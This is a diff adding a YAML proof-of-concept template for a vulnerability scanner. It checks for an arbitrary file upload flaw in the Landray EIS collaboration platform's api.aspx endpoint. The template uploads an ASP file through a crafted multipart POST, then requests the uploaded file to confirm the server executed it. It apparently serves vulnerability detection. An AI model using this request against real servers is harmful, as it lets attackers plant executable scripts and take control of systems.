@@ -1,0 +1,38 @@
+id: poc-yaml-landray-eis-intelligent-collaboration-platform-api-aspx-anyfile-upload
+info:
+  name: 蓝凌EIS 智慧协同平台 api.aspx 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 两高一弱
+  - 文件上传
+  finger: 蓝凌EIS
+variables:
+  t1: random_str(4)
+requests:
+- method: POST
+  path: /eis/service/api.aspx?action=saveImg
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynUqjgvhmkL1dxpCV
+  data: '------WebKitFormBoundarynUqjgvhmkL1dxpCV
+
+    Content-Disposition: form-data; name="file"filename="test.asp"
+
+    Content-Type: text/html
+
+
+    <% response.write("{{.t1}}")%>
+
+    ------WebKitFormBoundarynUqjgvhmkL1dxpCV--'
+  expression: 'status_code == 200
+
+    && contains(body,"asp")
+
+    && contains(body,"files")
+
+    '
+  output:
+  - regex_match(body,"(?P<t2>[0-9]{20})")
+- method: GET
+  path: /files/editor_img/{{.t2}}/{{.t2}}.asp
+  expression: status_code == 200 && body == t1
+transport: http
